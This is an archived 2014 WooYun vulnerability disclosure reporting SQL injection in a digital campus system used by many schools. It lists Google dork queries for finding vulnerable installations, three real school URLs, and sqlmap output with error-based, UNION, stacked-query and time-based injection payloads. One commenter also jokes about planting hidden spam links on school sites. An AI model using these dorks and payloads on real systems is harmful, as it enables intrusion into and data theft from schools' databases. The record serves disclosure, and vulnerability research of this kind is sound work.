{"id": 1352, "wybug_id": "wooyun-2014-065457", "wybug_title": "某通用型数字校园系统SQL注射漏洞（涉及大量学校）", "wybug_corp": "cncert", "wybug_author": "神奇的路人甲", "wybug_date": "2014-06-19 10:07", "wybug_open_date": "2014-09-17 10:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-17：\t细节向公众公开  简要描述： 0.0 详细说明：  无锡新座标教育技术有限公司 的数字化校园系统存在通用型SQL注射漏洞装机量比较大。谷歌关键词：intitle:校园 技术支持：无锡新座标教育技术有限公司连接：\nhttp://209.116.186.246/#newwindow=1&q=intitle:%E6%A0%A1%E5%9B%AD+%E6%8A%80%E6%9C%AF%E6%94%AF%E6%8C%81%EF%BC%9A%E6%97%A0%E9%94%A1%E6%96%B0%E5%BA%A7%E6%A0%87%E6%95%99%E8%82%B2%E6%8A%80%E6%9C%AF%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8\n近4000收录量\n\nSQL注射点：DPMA/FWeb/WorkRoomWeb/Web/Index.aspx?TID=谷歌关键词：inurl:DPMA/FWeb/WorkRoomWeb/Web/Index.aspx?TID=连接：\nhttp://209.116.186.246/#newwindow=1&q=inurl:DPMA%2FFWeb%2FWorkRoomWeb%2FWeb%2FIndex.aspx%3FTID%3D\n35w收录\n\n案例1：http://szxy.ncjy.net/DPMA/FWeb/WorkRoomWeb/Web/Index.aspx?TID=1000210106---Place: GETParameter: TID    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TID=1000210106 AND 8259=CONVERT(INT,(SELECT CHAR(113)+CHAR(108)+CHAR(105)+CHAR(117)+CHAR(113)+(SELECT (CASE WHEN (8259=8259) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(111)+CHAR(116)+CHAR(113)))    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: TID=1000210106 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(108)+CHAR(105)+CHAR(117)+CHAR(113)+CHAR(114)+CHAR(88)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(113)+CHAR(117)+CHAR(115)+CHAR(100)+CHAR(99)+CHAR(113)+CHAR(112)+CHAR(111)+CHAR(116)+CHAR(113),NULL,NULL,NULL,NULL--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: TID=1000210106 AND 2239=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)---web server operating system: Windowsweb application technology: ASP.NET, Nginx, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005\n\n\n案例2：http://www.azxx.net/dpma/FWeb/WorkRoomWeb/Web/Index.aspx?TID=3050010176---Place: GETParameter: TID    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TID=3050010176 AND 3214=CONVERT(INT,(SELECT CHAR(113)+CHAR(102)+CHAR(97)+CHAR(97)+CHAR(113)+(SELECT (CASE WHEN (3214=3214) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(102)+CHAR(104)+CHAR(122)+CHAR(113)))    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: TID=3050010176 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(102)+CHAR(97)+CHAR(97)+CHAR(113)+CHAR(80)+CHAR(111)+CHAR(70)+CHAR(67)+CHAR(84)+CHAR(104)+CHAR(108)+CHAR(66)+CHAR(76)+CHAR(87)+CHAR(113)+CHAR(102)+CHAR(104)+CHAR(122)+CHAR(113),NULL,NULL,NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: TID=3050010176; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: TID=3050010176 WAITFOR DELAY '0:0:5'-----[21:49:18] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005\n\n\n   漏洞证明：  \n案例3：http://www.fstc.pdedu.sh.cn/dpma/FWeb/WorkRoomWeb/Web/Index.aspx?TID=3300010006---Place: GETParameter: TID    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TID=3300010006 AND 6531=CONVERT(INT,(SELECT CHAR(113)+CHAR(121)+CHAR(105)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (6531=6531) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(116)+CHAR(102)+CHAR(113)))    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: TID=3300010006 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(121)+CHAR(105)+CHAR(113)+CHAR(113)+CHAR(90)+CHAR(106)+CHAR(66)+CHAR(104)+CHAR(97)+CHAR(81)+CHAR(114)+CHAR(119)+CHAR(86)+CHAR(77)+CHAR(113)+CHAR(113)+CHAR(116)+CHAR(102)+CHAR(113),NULL,NULL,NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: TID=3300010006; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: TID=3300010006 WAITFOR DELAY '0:0:5'-----[21:50:39] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 神奇的路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-06-23 22:19 厂商回复： CNVD确认并复现所述情况（两至三个实例确认通用性），通过公开联系渠道暂未获知软件生产厂商联系方式，待处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-19 11:19 |    \t\t赵健康 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:3        | 慢慢进步！！！)\t\t \n  有我们学校没    \n     2014-06-19 11:32 |    \t\t神奇的路人甲 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:16        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  @赵健康 看样子有    \n     2014-06-19 11:39 |    \t\tg00 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 终于进来了~)\t\t \n  楼主错失100W，学校站，挂黑链，一年100w，5年能混北京户口，4年能换绿卡~~~    \n     2014-06-19 13:38 |    \t\t牛博恩 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:3        | Oh god my savior)\t\t \n  @g00 100w还不够在北京买房的。    \n     2014-06-19 13:52 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @g00 100W再送一副925纯银手镯    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}